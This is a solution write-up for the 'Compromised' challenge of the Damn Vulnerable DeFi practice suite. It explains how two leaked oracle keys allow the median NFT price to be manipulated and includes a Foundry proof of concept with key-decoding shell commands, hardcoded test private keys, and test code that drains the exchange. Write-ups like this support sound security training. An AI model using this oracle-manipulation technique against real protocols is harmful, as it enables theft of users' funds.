# Damn Vulnerable DeFi - Compromised - Solution Report

## Problem Analysis

### Contract Summary

The challenge involves three main contracts:

1. `TrustfulOracle`: An on-chain oracle that relies on multiple trusted sources to report prices for symbols. The median price across all sources is used as the final price.

   - `postPrice(string symbol, uint256 newPrice)`: Allows trusted sources to update prices.
   - `getMedianPrice(string symbol)`: Returns the median price for a given symbol.

2. `Exchange`: A contract for buying and selling NFTs at prices determined by the oracle.

   - `buyOne()`: Allows users to buy an NFT at the current oracle price.
   - `sellOne(uint256 id)`: Allows users to sell an NFT back to the exchange at the current oracle price.

3. `DamnValuableNFT`: A simple ERC721 token used in the exchange.

### Initial Setup

- The exchange is initialized with 999 ETH.
- The NFT price is set to 999 ETH.
- The player starts with 0.1 ETH.
- Three trusted oracle sources are set up with initial balances of 2 ETH each.

### Success Criteria

To solve the challenge, the player must:

1. Drain all ETH from the exchange (999 ETH).
2. Transfer the drained funds to a designated recovery address.
3. Ensure the player doesn't own any NFTs at the end.
4. Restore the NFT price in the oracle to its initial value (999 ETH).

The challenge hints at a potential vulnerability in the web service of a popular DeFi project, providing two strange hex-encoded strings in the server response.

## Vulnerability

The vulnerability in this challenge lies in the compromised private keys of two of the three trusted oracle sources. This compromise is hinted at in the strange server response provided in the challenge description:

```
4d 48 67 33 5a 44 45 31 59 6d 4a 68 4d 6a 5a 6a 4e 54 49 7a 4e 6a 67 7a 59 6d 5a 6a 4d 32 52 6a 4e 32 4e 6b 59 7a 56 6b 4d 57 49 34 59 54 49 33 4e 44 51 30 4e 44 63 31 4f 54 64 6a 5a 6a 52 6b 59 54 45 33 4d 44 56 6a 5a 6a 5a 6a 4f 54 6b 7a 4d 44 59 7a 4e 7a 51 30

4d 48 67 32 4f 47 4a 6b 4d 44 49 77 59 57 51 78 4f 44 5a 69 4e 6a 51 33 59 54 59 35 4d 57 4d 32 59 54 56 6a 4d 47 4d 78 4e 54 49 35 5a 6a 49 78 5a 57 4e 6b 4d 44 6c 6b 59 32 4d 30 4e 54 49 30 4d 54 51 77 4d 6d 46 6a 4e 6a 42 69 59 54 4d 33 4e 32 4d 30 4d 54 55 35
```

These hex strings, when properly decoded, reveal the private keys of two of the trusted sources. The vulnerability stems from the following issues:

1. Inadequate key management: The private keys of trusted sources should never be exposed or transmitted in any form, especially not through a web service response.

2. Over-reliance on trusted sources: The `TrustfulOracle` contract (lines 31-36 in TrustfulOracle.sol) allows any address with the `TRUSTED_SOURCE_ROLE` to post prices without additional verification:

```solidity
function postPrice(string calldata symbol, uint256 newPrice) external onlyRole(TRUSTED_SOURCE_ROLE) {
    _setPrice(msg.sender, symbol, newPrice);
}
```

3. Lack of price sanity checks: The `Exchange` contract doesn't implement any safeguards against extreme price fluctuations. It blindly trusts the oracle's price (lines 59-60 in Exchange.sol):

```solidity
uint256 price = oracle.getMedianPrice(token.symbol());
if (msg.value < price) {
    revert InvalidPayment();
}
```

These vulnerabilities allow an attacker with knowledge of the compromised private keys to manipulate the oracle prices at will, potentially draining the entire balance of the `Exchange` contract.

## Attack Method

The attack exploits the compromised private keys of two trusted oracle sources to manipulate the NFT price and drain the Exchange contract. The attack proceeds as follows:

1. Decode the compromised private keys:

   - Convert the hex strings from the server response to obtain the private keys of two trusted sources.
   - Verify that the derived addresses match two of the three trusted sources in the oracle.

2. Manipulate the oracle price to zero:

   - Use the compromised private keys to call `postPrice()` on the TrustfulOracle contract.
   - Set the price of "DVNFT" to 0 from both compromised sources.
   - This manipulation causes the median price to become 0.

3. Buy an NFT at the manipulated price:

   - Call `buyOne()` on the Exchange contract with a minimal amount of ETH (e.g., 1 wei).
   - Due to the manipulated price, the NFT is acquired almost for free.

4. Manipulate the oracle price to drain the exchange:

   - Use the compromised private keys again to call `postPrice()`.
   - Set the new price to the entire balance of the Exchange contract.
   - This manipulation causes the median price to become equal to the Exchange's balance.

5. Sell the NFT at the inflated price:

   - Approve the Exchange contract to transfer the NFT.
   - Call `sellOne()` on the Exchange contract with the acquired NFT's ID.
   - This action transfers the entire balance of the Exchange to the attacker.

6. Transfer the drained funds:

   - Send the acquired funds (999 ETH) to the designated recovery address.

7. Reset the oracle price:
   - Use the compromised private keys one last time to call `postPrice()`.
   - Set the price back to the initial value of 999 ETH.
   - This step ensures that the final state of the oracle matches the initial state.

By following these steps, the attacker can drain the entire balance of the Exchange contract while meeting all the success criteria of the challenge.

## Proof of Concept (PoC)

### Core Implementation

The core implementation of the attack is contained in the `test_compromised()` function in the `CompromisedChallenge` contract. Here's a breakdown of the key steps:

1. Decode and verify the compromised private keys:

First, we use bash commands to decode the hex strings and obtain the private keys:

```bash
# For the first private key
PRIVATE_KEY1=$(echo -n "4d 48 67 33 5a 44 45 31 59 6d 4a 68 4d 6a 5a 6a 4e 54 49 7a 4e 6a 67 7a 59 6d 5a 6a 4d 32 52 6a 4e 32 4e 6b 59 7a 56 6b 4d 57 49 34 59 54 49 33 4e 44 51 30 4e 44 63 31 4f 54 64 6a 5a 6a 52 6b 59 54 45 33 4d 44 56 6a 5a 6a 5a 6a 4f 54 6b 7a 4d 44 59 7a 4e 7a 51 30" |
    tr -d ' ' |           # Remove all spaces from the hex string
    xxd -r -p |           # Convert hex to binary
    base64 -d |           # Decode from base64
    cast --to-hex         # Convert the result to a hex string
)
echo "Private Key 1: $PRIVATE_KEY1"
ADDRESS1=$(cast wallet address $PRIVATE_KEY1)  # Derive Ethereum address from the private key
echo "Address 1: $ADDRESS1"

# For the second private key
PRIVATE_KEY2=$(echo -n "4d 48 67 32 4f 47 4a 6b 4d 44 49 77 59 57 51 78 4f 44 5a 69 4e 6a 51 33 59 54 59 35 4d 57 4d 32 59 54 56 6a 4d 47 4d 78 4e 54 49 35 5a 6a 49 78 5a 57 4e 6b 4d 44 6c 6b 59 32 4d 30 4e 54 49 30 4d 54 51 77 4d 6d 46 6a 4e 6a 42 69 59 54 4d 33 4e 32 4d 30 4d 54 55 35" |
    tr -d ' ' |           # Remove all spaces from the hex string
    xxd -r -p |           # Convert hex to binary
    base64 -d |           # Decode from base64
    cast --to-hex         # Convert the result to a hex string
)
echo "Private Key 2: $PRIVATE_KEY2"
ADDRESS2=$(cast wallet address $PRIVATE_KEY2)  # Derive Ethereum address from the private key
echo "Address 2: $ADDRESS2"
```

Then, in the Solidity test, we use these decoded private keys:

```solidity
uint256 privateKey1 = 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744;
uint256 privateKey2 = 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159;

address source1 = vm.addr(privateKey1);
address source2 = vm.addr(privateKey2);

// Verify these addresses are in the trusted sources
bool foundSource1 = false;
bool foundSource2 = false;
for (uint256 i = 0; i < sources.length; i++) {
    if (sources[i] == source1) foundSource1 = true;
    if (sources[i] == source2) foundSource2 = true;
}
require(foundSource1 && foundSource2, "Derived addresses are not in the trusted sources");
```

2. Manipulate the oracle price to zero:

```solidity
vm.startPrank(source1);
oracle.postPrice("DVNFT", 0);
vm.stopPrank();

vm.startPrank(source2);
oracle.postPrice("DVNFT", 0);
vm.stopPrank();
```

3. Buy an NFT at the manipulated price:

```solidity
vm.startPrank(player);
uint256 tokenId = exchange.buyOne{value: 1 wei}();
vm.stopPrank();
```

4. Manipulate the price to drain the exchange:

```solidity
uint256 drainPrice = address(exchange).balance;
vm.startPrank(source1);
oracle.postPrice("DVNFT", drainPrice);
vm.stopPrank();

vm.startPrank(source2);
oracle.postPrice("DVNFT", drainPrice);
vm.stopPrank();
```

5. Sell the NFT at the inflated price:

```solidity
vm.startPrank(player);
nft.approve(address(exchange), tokenId);
exchange.sellOne(tokenId);
// ...
vm.stopPrank();
```

6. Transfer the drained funds:

```solidity
vm.startPrank(player);
// ...
payable(recovery).transfer(EXCHANGE_INITIAL_ETH_BALANCE);
vm.stopPrank();
```

7. Reset the oracle price:

```solidity
vm.startPrank(source1);
oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
vm.stopPrank();

vm.startPrank(source2);
oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
vm.stopPrank();
```

### Running Result

```
    ├─ [0] VM::assertEq(0, 0) [staticcall]
    │   └─ ← [Return]
    ├─ [0] VM::assertEq(999000000000000000000 [9.99e20], 999000000000000000000 [9.99e20]) [staticcall]
    │   └─ ← [Return]
    ├─ [679] DamnValuableNFT::balanceOf(player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] VM::assertEq(0, 0) [staticcall]
    │   └─ ← [Return]
    ├─ [5281] TrustfulOracle::getMedianPrice("DVNFT") [staticcall]
    │   └─ ← [Return] 999000000000000000000 [9.99e20]
    ├─ [0] VM::assertEq(999000000000000000000 [9.99e20], 999000000000000000000 [9.99e20]) [staticcall]
    │   └─ ← [Return]
    └─ ← [Stop]
```
